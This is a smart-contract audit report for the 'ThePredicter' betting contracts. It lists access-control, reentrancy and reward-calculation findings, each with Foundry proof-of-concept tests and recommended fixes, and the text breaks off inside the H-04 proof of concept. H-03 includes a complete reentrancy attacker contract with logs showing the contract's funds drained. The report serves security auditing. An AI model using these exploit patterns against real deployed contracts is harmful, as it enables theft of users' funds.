# First Flight #20: The Predicter - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. `ThePredicter::makePrediction` has no access controls and any unapproved user can make predicitions causing an incorrect calculation and distribution of rewards](#H-01)
    - [H-02. `ScoreBoard::setPrediction` Has No Access Control, Allowing Unauthorised Modifications and Score Manipulation to any Player Predictions](#H-02)
    - [H-03. Reentrancy attack in the `ThePredicter::cancelRegistration` function allows entrant to drain contract balance.](#H-03)
    - [H-04. Player can only withdraw if they make two or more prediction instead of one](#H-04)
    - [H-05. `ThePredicter.withdraw` combined with `ScoreBoard.setPrediction` allows a player to withdraw rewards multiple times leading to a drain of funds in the contract](#H-05)
- ## Medium Risk Findings
    - [M-01. Incorrect Time Calculation](#M-01)
    - [M-02. ThePredicter.withdrawPredictionFees incorrectly computes the value to be transferred to the organizer, which leads to pending players not being able to cancel their registration and approved players not being able to claim their rewards](#M-02)
    - [M-03. [H-2] Not accounting for a possible score of 0 in `ThePredictor::withdraw` will lead to stuck funds](#M-03)
- ## Low Risk Findings
    - [L-01. It would be possible to make a prediction for an ongoing or already finished match if the Arbitrum timestamps deviate according to what the documentation states as possible](#L-01)
    - [L-02. Small amount of funds can remain stuck in contract due to precision loss](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #20

### Dates: Jul 18th, 2024 - Jul 25th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-07-the-predicter)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 5
   - Medium: 3
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. `ThePredicter::makePrediction` has no access controls and any unapproved user can make predicitions causing an incorrect calculation and distribution of rewards

_Submitted by [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [Vik](/profile/clymxs69m0004elf11nb8vr2s), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [uba7](/profile/cllina1ss0000jt08ols0vdm7), [evmninja](/profile/clxxng1pm0000mnz6avhempwf), [Rabeet10](/profile/clytoaqo1000atakw75qzbtvz), [UAARRR](/profile/clv9ugh840002duba7pq237az), [cryptedOji](/profile/clxq432gf0000oyuawxf6o6f7), [pob001](/profile/cly3k3wi10004mwcab5qdnjis), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Strapontin](/profile/cly31tqmc000a4ts4lyngk9ro), [0xD4n13l](/profile/cly4ahx3v0002foqagqltp3n7), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Greese](/profile/cly3p0t680000xrr4hv5jmgby), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [0xsalami](/profile/clt01df3800035pfctlu2xr0m), [n3smaro](/profile/clyw8gc2200009pkxbzh2omnk), [vile](/profile/clvl1hox70000qclhbwnf9nhh), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [bytesflow007](/profile/clywm16360006sr4igeys47em), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [CoderOfPHCity](/profile/clymt4o9v000ci1pjryaxc50o), [emma77](/profile/cly4a1lnh0006toid1f968izd), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [vinicaboy](/profile/clvguw51c0000i5vku9mx50lp), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [FrontRunner](/profile/cly4fmqoh0007xkrp388nctox), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [ElProfesor](/profile/cly2u64aq0006jz4llp8el8nu), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [GuireWire](/profile/clyaxj9ae00004tx9iw2f6chf), [farismaulana](/profile/clrjedt8p00008caw8psia6oh), [Decap](/profile/clxq2qv860000147d51xg5d88), [kapten](/profile/clvkgt6g50000zx4r6jijra5k), [4rtist3](/profile/clyy92ilq000ctlyvp2cqv0bs), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [iamthesvn](/profile/clwq0jvk500002bu6kde6smv1), [kazan](/profile/clojsw8kw000cl408g7y0xlw5), [EdTim](/team/clyyfb36400015vdk4lj72qel), [14xSachet](/profile/clz15oltz0006q1gtgf0ywir8). Selected submission by: [Greese](/profile/cly3p0t680000xrr4hv5jmgby)._      
            


## Summary

`ThePredicter::makePrediction` has no access controls and any unapproved user can make predicitions causing an incorrect calculation and distribution of rewards

## Vulnerability Details

Relevant links
<https://github.com/Cyfrin/2024-07-the-predicter/blob/main/src/ThePredicter.sol>

Any user can call `ThePredicter::makePrediction` without the organizer's approval. When `totalShares` is calculated in `ThePredicter::withdraw` it only takes into account approved users. Because of the discrepency between the number of approved users and actual users who made a predicition, the proportion to the points collected by all Players with a positive number of points is incorrect.

```Solidity
function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

Total shares are calculated incorrectly in `ThePredicter::withdraw` because the attacker is not in the approved players array

```Solidity
for (uint256 i = 0; i < players.length; ++i) {
            int8 cScore = scoreBoard.getPlayerScore(players[i]);
            if (cScore > maxScore) maxScore = cScore;
            if (cScore > 0) totalPositivePoints += cScore;
        }
```

reward for each user will be incorrect

```Solidity
        uint256 shares = uint8(score);
        uint256 totalShares = uint256(totalPositivePoints);
        uint256 reward = 0;

        reward = maxScore < 0
            ? entranceFee
            : (shares * players.length * entranceFee) / totalShares;
```

## POC

Add the following test to ThePredicter.test.sol

```Solidity
function test_unapprovedPredictions() public {
        
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        address attacker = makeAddr("attacker");

        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        //attacker comes in and makes a prediciton. Doesnt even need to register.
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger2.balance, 0.9997 ether);

        //attacker front runs the last player
        vm.startPrank(attacker);
        thePredicter.withdraw();
        vm.stopPrank();

        //address balance is already 0 before the last player can withdraw their reward
        //reverts with EVM error OutOfFunds
        vm.startPrank(stranger3);
        assertEq(address(thePredicter).balance, 0 ether);
        vm.expectRevert("Failed to withdraw");
        thePredicter.withdraw();
        vm.stopPrank();
    }
```

## Impact

An attacker can withdraw before the contract balance runs out and some users will be unable to claim the reward they are entitled to.

## Tools Used
Manual Review

## Recommendations
Add a new custom error in `ThePredicter`
```diff
    error ThePredicter__IncorrectEntranceFee();
    error ThePredicter__RegistrationIsOver();
    error ThePredicter__IncorrectPredictionFee();
    error ThePredicter__AllPlacesAreTaken();
    error ThePredicter__CannotParticipateTwice();
    error ThePredicter__NotEligibleForWithdraw();
    error ThePredicter__PredictionsAreClosed();
    error ThePredicter__UnauthorizedAccess();
+   error ThePredicter__UnapprovedUser();
```

Revert in `makePrediction` if user is not approved to be a player
```diff
 function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

+       if (playersStatus[msg.sender] != Status.Approved) {
+           revert ThePredicter__UnapprovedUser();
+       }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

## <a id='H-02'></a>H-02. `ScoreBoard::setPrediction` Has No Access Control, Allowing Unauthorised Modifications and Score Manipulation to any Player Predictions

_Submitted by [Vik](/profile/clymxs69m0004elf11nb8vr2s), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [uba7](/profile/cllina1ss0000jt08ols0vdm7), [evmninja](/profile/clxxng1pm0000mnz6avhempwf), [0x40](/profile/clqim6y8j0006lgfv35y3lfup), [Batman](/profile/clkc47fv10006l908u64cn5ef), [supplisec](/profile/clylrp7ap0000cgzchdi6dvnl), [Strapontin](/profile/cly31tqmc000a4ts4lyngk9ro), [cryptedOji](/profile/clxq432gf0000oyuawxf6o6f7), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Bbash](/profile/clkcphh780004mp083mgcgae1), [Enchev](/profile/clvuhiie70000behfon10s33j), [Monstitude](/profile/clpf1gemf0000ngm0m2jtmfgw), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [EyanIngles](/profile/clxh58cp20000v6jwv7hjrjyh), [vinicaboy](/profile/clvguw51c0000i5vku9mx50lp), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Tomas0707](/profile/clyr7capb000lds5vs80fhv4n), [vile](/profile/clvl1hox70000qclhbwnf9nhh), [0xsalami](/profile/clt01df3800035pfctlu2xr0m), [n3smaro](/profile/clyw8gc2200009pkxbzh2omnk), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [BryanConquer](/profile/cllw1qa7j0000jw08yme07cs2), [bytesflow007](/profile/clywm16360006sr4igeys47em), [emma77](/profile/cly4a1lnh0006toid1f968izd), [soupy](/profile/clxtrdlee0002mh58dhdplsq9), [CoderOfPHCity](/profile/clymt4o9v000ci1pjryaxc50o), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [NHristov](/profile/clxfyt9d30000oxkgwfkjr7rz), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Mikb](/profile/clslpacxq0000feicl13m1czy), [ayamercy](/team/clz09i1y50001hibkcpjzt4np), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [farismaulana](/profile/clrjedt8p00008caw8psia6oh), [FrontRunner](/profile/cly4fmqoh0007xkrp388nctox), [0xD4n13l](/profile/cly4ahx3v0002foqagqltp3n7), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [Decap](/profile/clxq2qv860000147d51xg5d88), [4rtist3](/profile/clyy92ilq000ctlyvp2cqv0bs), [EdTim](/team/clyyfb36400015vdk4lj72qel), [14xSachet](/profile/clz15oltz0006q1gtgf0ywir8). Selected submission by: [EyanIngles](/profile/clxh58cp20000v6jwv7hjrjyh)._      
            


## Summary

The `setPrediction` function allows any address to access and change the predictions of any player who has used the `ThePredicter::makePrediction` function. Until the `block.timestamp` passes the designated cutoff time, predictions can be altered. This enables a malicious player to change another player's prediction to `Pending` just before the cutoff, causing the affected player to receive no points. This also allows the malicious player to maximize their profit by ensuring other players' scores remain at zero

## Vulnerability Details

The following code is to be used in `ThePredicter.test.sol` file.

1. We have 3 players called `player1`, `player2` and `player3` who have registered, have addresses approved by `organizer` and make 3 predictions each player.
2. The `organizer` sets the scores, for this example we set them all at once with results of `First`. Meanwhile `player1` has changed the predictions of `player2` and `player3` for games 1 and 2 to `Pending` giving them a score of 0.
3. We then warp the timestamp to `1723888799` for game #3, have `player1` change the predictions of `player2` and `player3` to result of `Pending`.
4. `player2` realises that their score isnt reflecting what they have predicted, `player2` tries to change the prediction using `setPrediction` to result of `First`, but because it is after the allocated time, score has been set and cant be reversed leaving with a score of 0 as per following scores below.

```Solidity
player1 score: 6
player2 score: 0
player3 score: 0
```

1. `organizer` calls `withdrawPredictionFees` to receive the amount to pay hall rent according to the `README.md` file.
2. `player1` withdraws their reward prize, draining the prize pool maximising their earnings.

```Solidity
    function testSetPredicitonScenerio() public {
        address player1 = makeAddr("player1");
        address player2 = makeAddr("player2");
        address player3 = makeAddr("player3");

        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(player3);
        vm.deal(player3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(player1);
        thePredicter.approvePlayer(player2);
        thePredicter.approvePlayer(player3);
        vm.stopPrank();

        vm.startPrank(player1);
        thePredicter.makePrediction{value: 0.0001 ether}(1, ScoreBoard.Result.First);
        thePredicter.makePrediction{value: 0.0001 ether}(2, ScoreBoard.Result.First);
        thePredicter.makePrediction{value: 0.0001 ether}(3, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(player2);
        thePredicter.makePrediction{value: 0.0001 ether}(1, ScoreBoard.Result.First);
        thePredicter.makePrediction{value: 0.0001 ether}(2, ScoreBoard.Result.First);
        thePredicter.makePrediction{value: 0.0001 ether}(3, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(player3);
        thePredicter.makePrediction{value: 0.0001 ether}(1, ScoreBoard.Result.First);
        thePredicter.makePrediction{value: 0.0001 ether}(2, ScoreBoard.Result.First);
        thePredicter.makePrediction{value: 0.0001 ether}(3, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(player1);
        scoreBoard.setPrediction(address(player2), 1, ScoreBoard.Result.Pending);
        scoreBoard.setPrediction(address(player3), 1, ScoreBoard.Result.Pending);

        scoreBoard.setPrediction(address(player2), 2, ScoreBoard.Result.Pending);
        scoreBoard.setPrediction(address(player2), 2, ScoreBoard.Result.Pending);
        vm.stopPrank();
        //get players scores
        int8 player1score = scoreBoard.getPlayerScore(address(player1));
        int8 player2score = scoreBoard.getPlayerScore(address(player2));
        int8 player3score = scoreBoard.getPlayerScore(address(player3));

        vm.warp(1723888799); // game 3.
        vm.startPrank(player1);
        scoreBoard.setPrediction(address(player2), 3, ScoreBoard.Result.Pending);
        scoreBoard.setPrediction(address(player3), 3, ScoreBoard.Result.Pending);
        scoreBoard.isEligibleForReward(address(player1)); //is eligable.
        vm.stopPrank();
        vm.warp(1723888801); // game 3.
        vm.startPrank(organizer);
        vm.stopPrank();
      
        //player 2 realises that the results have been changed and tries to change them back.
        vm.startPrank(player2);
        scoreBoard.setPrediction(address(player2), 3, ScoreBoard.Result.First);
        vm.stopPrank();

        int8 player1score1 = scoreBoard.getPlayerScore(address(player1));
        int8 player2score1 = scoreBoard.getPlayerScore(address(player2));
        int8 player3score1 = scoreBoard.getPlayerScore(address(player3));

        //checking balance and withdrawing.
        uint256 balanceBefore = player1.balance;
        console.log("balance before withdraw:", balanceBefore);
        vm.startPrank(player1);
        thePredicter.withdraw();
        vm.stopPrank();
        uint256 balanceAfter = player1.balance;
        console.log("balance after withdraw:", balanceAfter);
        uint256 prizePoolBalance = address(thePredicter).balance;
        console.log("balance of prizePool after withdraw:", prizePoolBalance);
    }
```

## Impact

The impact of this vulnerability is that a player can change other players' predictions without their knowledge until the designated time has passed. As a result, the affected player cannot change their prediction back, leading to potential manipulation and unfair outcomes.

## Tools Used

Manual review

## Recommendations

Add the `onlyThePredicter` modifier to ensure that it is only `ThePredicter` contract that calls and execute this function.

```diff
function setPrediction(address player, uint256 matchNumber, Result result)
-    public {
+   public onlyThePredicter {
        if (
            block.timestamp <= START_TIME + matchNumber * 68400 - 68400
        ) {
            playersPredictions[player].predictions[matchNumber] = result;
        }
        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (playersPredictions[player].predictions[i] != Result.Pending && playersPredictions[player].isPaid[i]) {
                ++playersPredictions[player].predictionsCount;
            }
        }
}
```

## <a id='H-03'></a>H-03. Reentrancy attack in the `ThePredicter::cancelRegistration` function allows entrant to drain contract balance.

_Submitted by [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [Vik](/profile/clymxs69m0004elf11nb8vr2s), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [Leogold](/profile/cll3x4wjp0000jv08bizzorhg), [0xrochimaru](/profile/clk687ykf0000l608ovci3h3y), [Nyllme](/profile/clytdg3fq0000m12ozlw1vnun), [Saurabh](/profile/clymo4jw00000348qfz2ncao1), [evmninja](/profile/clxxng1pm0000mnz6avhempwf), [firmanregar](/profile/clk83mi5b0004jp08axr82nq1), [abdxzi](/profile/cly1va4rp0000q2sdpapiinsn), [Greese](/profile/cly3p0t680000xrr4hv5jmgby), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [0x40](/profile/clqim6y8j0006lgfv35y3lfup), [cryptedOji](/profile/clxq432gf0000oyuawxf6o6f7), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [Cas](/profile/clyl36aw1000aazedszqcyh98), [x0rc1ph3r](/profile/clutxdwvi0007cls7asywzqld), [supplisec](/profile/clylrp7ap0000cgzchdi6dvnl), [pob001](/profile/cly3k3wi10004mwcab5qdnjis), [Bbash](/profile/clkcphh780004mp083mgcgae1), [Enchev](/profile/clvuhiie70000behfon10s33j), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Monstitude](/profile/clpf1gemf0000ngm0m2jtmfgw), [0xD4n13l](/profile/cly4ahx3v0002foqagqltp3n7), [Tomas0707](/profile/clyr7capb000lds5vs80fhv4n), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [Strapontin](/profile/cly31tqmc000a4ts4lyngk9ro), [vile](/profile/clvl1hox70000qclhbwnf9nhh), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [NHristov](/profile/clxfyt9d30000oxkgwfkjr7rz), [BryanConquer](/profile/cllw1qa7j0000jw08yme07cs2), [0x3a22](/profile/clyw6hcps0000a96jya8ow8v6), [Kiinzu](/profile/clx32i4zw000wuro9kj83liax), [vinicaboy](/profile/clvguw51c0000i5vku9mx50lp), [bytesflow007](/profile/clywm16360006sr4igeys47em), [soupy](/profile/clxtrdlee0002mh58dhdplsq9), [emma77](/profile/cly4a1lnh0006toid1f968izd), [CoderOfPHCity](/profile/clymt4o9v000ci1pjryaxc50o), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [farismaulana](/profile/clrjedt8p00008caw8psia6oh), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [JJS](/profile/clyya58sm00006knh5pfym34a), [FrontRunner](/profile/cly4fmqoh0007xkrp388nctox), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [nem0x001](/profile/clvxvlp6300092p0m0ax68l8t), [Mikb](/profile/clslpacxq0000feicl13m1czy), [kapten](/profile/clvkgt6g50000zx4r6jijra5k), [PatrickWorks](/profile/clxuq1bgc0000xkea15f3i4ty), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [Decap](/profile/clxq2qv860000147d51xg5d88), [ayamercy](/team/clz09i1y50001hibkcpjzt4np), [ElProfesor](/profile/cly2u64aq0006jz4llp8el8nu), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [GuireWire](/profile/clyaxj9ae00004tx9iw2f6chf), [SuperDevFavour](/profile/clvvephrc00006vdydj14i3ni), [ivanonchain](/profile/clynomnfs0000g3kl460qpvlz), [NitAuditzz](/profile/clwjf3tz3000015npkmxzk2p8), [MyssTeeQue](/profile/cltpjm7qt000010v3uc0nna8e), [Shalafat](/profile/clvz9swar0000ck6v8rf2uxh1), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [iamthesvn](/profile/clwq0jvk500002bu6kde6smv1), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [kazan](/profile/clojsw8kw000cl408g7y0xlw5), [Caesar](/profile/cly4c6opu00006ixlxrmy6rc2), [EdTim](/team/clyyfb36400015vdk4lj72qel), [14xSachet](/profile/clz15oltz0006q1gtgf0ywir8). Selected submission by: [Saurabh](/profile/clymo4jw00000348qfz2ncao1)._      
            


## Summary: 

`ThePredicter::cancelRegistration` function  does not follow CEI(Check, Effect, Intractions) and as a result cause reentrance of user , enable user to drain the contract balance.

## Vulnerability Details : 

In the `ThePredicter::cancelRegistration` function, we first make an external call to the `msg.sender` address and only after making that external call  we update the `ThePredicter::playersStatus` mapping(status of user).

```Solidity
function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
 @>           (bool success,) = msg.sender.call{value: entranceFee}("");
 @>           require(success, "Failed to withdraw");
 @>           playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```

A player who has entered the raffle could have a `fallback`/`recieve` function that calls the `ThePredicter::cancelRegistration` function again and claim another refund. They could continue the cycle till the contract balance is drained.

## Impact : All fee paid by  entrants could be stolen by the malicious participant.

## Proof Of Concept : Place the following into `ThePredicter.test.sol`

```solidity
function testReentrancycancelRefund() public {
        //three player enterd the betting contract and there status will be in pending state.
        for (uint160 i = 0; i < 3; i++) {
            hoax(address(i), 0.04 ether);
            thePredicter.register{value: 0.04 ether}();
        }
        console.log("current balance of contract", address(thePredicter).balance); //0.120000000000000000

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(thePredicter);
        address attackUser = makeAddr("attackUser");
        console.log("address of attackuser", attackUser);
        vm.deal(attackUser, 0.04 ether);

        uint256 startAttackerContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(thePredicter).balance;

        console.log("starting attacker contract balance", startAttackerContractBalance);
        console.log("starting contract balance", startingContractBalance);

        vm.prank(attackUser);
        attackerContract.attack{value: 0.04 ether}();

        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log("ending contract balance", address(thePredicter).balance);
    }
```

## And the below given contract as well

```Solidity
contract ReentrancyAttacker{
    ThePredicter public thePredicter;

    constructor(ThePredicter _thepredicter) {
        thePredicter = _thepredicter;
    }

    function attack() external payable {
        thePredicter.register{value: 0.04 ether}();
        thePredicter.cancelRegistration();
    }

    function stealmoney() internal {
        if (address(thePredicter).balance > 0) {
            thePredicter.cancelRegistration();
        }
    }

    // fallback() external payable {
    //     stealmoney();
    // }

    receive() external payable {
        stealmoney();
    }
}
```

## You will get the following output showing that the fee is stolen by the attacker

\
\[PASS] testReentrancycancelRefund() (gas: 1059820)\
Logs:\
current balance of contract 120000000000000000\
address of attackuser 0x61E508f13189CBFa85E602D504861BC81311112e\
starting attacker contract balance 0\
starting contract balance 120000000000000000\
ending attacker contract balance 160000000000000000\
ending contract balance 0

## Tools Used:- Manual review

## Recommendations :

 To prevent this, we should have the `ThePredicter::cancelRegistration` function update the `playersStatus` array before making the external call.

```diff
function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
-            (bool success,) = msg.sender.call{value: entranceFee}("");
-            require(success, "Failed to withdraw");
-            playersStatus[msg.sender] = Status.Canceled;
+            playersStatus[msg.sender] = Status.Canceled;
+            (bool success,) = msg.sender.call{value: entranceFee}("");
+            require(success, "Failed to withdraw");  
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```

## <a id='H-04'></a>H-04. Player can only withdraw if they make two or more prediction instead of one

_Submitted by [Vik](/profile/clymxs69m0004elf11nb8vr2s), [Strapontin](/profile/cly31tqmc000a4ts4lyngk9ro), [0xrochimaru](/profile/clk687ykf0000l608ovci3h3y), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [evmninja](/profile/clxxng1pm0000mnz6avhempwf), [pob001](/profile/cly3k3wi10004mwcab5qdnjis), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [Enchev](/profile/clvuhiie70000behfon10s33j), [cryptedOji](/profile/clxq432gf0000oyuawxf6o6f7), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Tomas0707](/profile/clyr7capb000lds5vs80fhv4n), [vile](/profile/clvl1hox70000qclhbwnf9nhh), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [emma77](/profile/cly4a1lnh0006toid1f968izd), [soupy](/profile/clxtrdlee0002mh58dhdplsq9), [CoderOfPHCity](/profile/clymt4o9v000ci1pjryaxc50o), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [JJS](/profile/clyya58sm00006knh5pfym34a), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [bytesflow007](/profile/clywm16360006sr4igeys47em), [Greese](/profile/cly3p0t680000xrr4hv5jmgby), [ayamercy](/team/clz09i1y50001hibkcpjzt4np), [PatrickWorks](/profile/clxuq1bgc0000xkea15f3i4ty), [ElProfesor](/profile/cly2u64aq0006jz4llp8el8nu), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [farismaulana](/profile/clrjedt8p00008caw8psia6oh), [Decap](/profile/clxq2qv860000147d51xg5d88), [ansarqureshi10](/profile/clx2ycuyb000112rotykervkf), [iamthesvn](/profile/clwq0jvk500002bu6kde6smv1), [SoulReaper](/profile/clyo4gcjd0006qkx7j73nyuep). Selected submission by: [farismaulana](/profile/clrjedt8p00008caw8psia6oh)._      
            


## Summary

as stated on the documentation `Players can receive an amount from the prize fund only if their total number of points is a positive number and if they had paid at least one prediction fee` but the latter are not the case because player can only withdraw after they make 2 prediction.

## Vulnerability Details

this vulnerability happens because the function `ScoreBoard::isEligibleForReward` use `playersPredictions[player].predictionsCount > 1` instead of `playersPredictions[player].predictionsCount >= 1`

```javascript
    function isEligibleForReward(address player) public view returns (bool) {
@>      return results[NUM_MATCHES - 1] != Result.Pending && playersPredictions[player].predictionsCount > 1;
    }
```

also there are error in the logic of `setPrediction` where it does not count for the first match `predictionCount` for the player.

```javascript
    function setPrediction(address player, uint256 matchNumber, Result result) public onlyThePredicter {
        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400) {
            playersPredictions[player].predictions[matchNumber] = result;
        }
        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
@>          if (playersPredictions[player].predictions[i] != Result.Pending && playersPredictions[player].isPaid[i]) {
                ++playersPredictions[player].predictionsCount;
            }
        }
    }

```

The line above always return false for the first match because the Result are still not being set for the first match.

<details><summary>POC</summary>

add the following code to the `ThePredicter.test.sol`:

```javascript
    function test_POCWithdrawAfterOnlyMakeOnePrediction() public {
        // player register and approved by organizer
        address player = makeAddr("player");
        vm.startPrank(player);
        vm.deal(player, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.prank(organizer);
        thePredicter.approvePlayer(player);

        // player start make one prediction and predict right
        vm.prank(player);
        thePredicter.makePrediction{value: thePredicter.predictionFee()}(0, ScoreBoard.Result.Draw);

